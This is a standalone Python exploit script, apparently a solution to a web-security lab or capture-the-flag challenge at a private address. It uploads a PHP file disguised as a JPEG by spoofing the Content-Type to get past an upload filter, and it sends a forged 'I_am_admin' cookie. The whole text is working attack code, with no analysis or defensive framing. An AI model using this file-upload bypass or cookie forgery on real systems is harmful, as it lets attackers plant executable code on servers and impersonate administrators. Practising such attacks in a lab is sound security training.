import requests


def fake_form_data(script_path):
    with open(script_path, 'rb') as f:
        script_content = f.read()

    boundary = '---------------------------boundary'
    form_data = f'--{boundary}\r\n'.encode('utf-8')
    form_data += b'Content-Disposition: form-data; name="uploaded"; filename="script.php"\r\n'
    form_data += b'Content-Type: image/jpeg\r\n\r\n'
    form_data += script_content
    form_data += f'\r\n--{boundary}\r\n'.encode('utf-8')
    form_data += b'Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n'
    form_data += b'10000\r\n'
    form_data += f'\r\n--{boundary}\r\n'.encode('utf-8')
    form_data += b'Content-Disposition: form-data; name="Upload"\r\n\r\n'
    form_data += b'Upload\r\n'
    form_data += f'--{boundary}--\r\n'.encode('utf-8')

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': 'I_am_admin=68934a3e9455fa72420237eb05902327',
        'Referer': 'http://192.168.56.3/?page=upload',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Content-Type': f'multipart/form-data; boundary={boundary}'
    }
    return form_data, headers

def main():
    script_path = './exploit.png.jpg.php'
    url = "http://192.168.56.3/?page=upload"

    form_data, headers = fake_form_data(script_path)

    try:
        response = requests.post(url, data=form_data, headers=headers)
        print(response.text)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
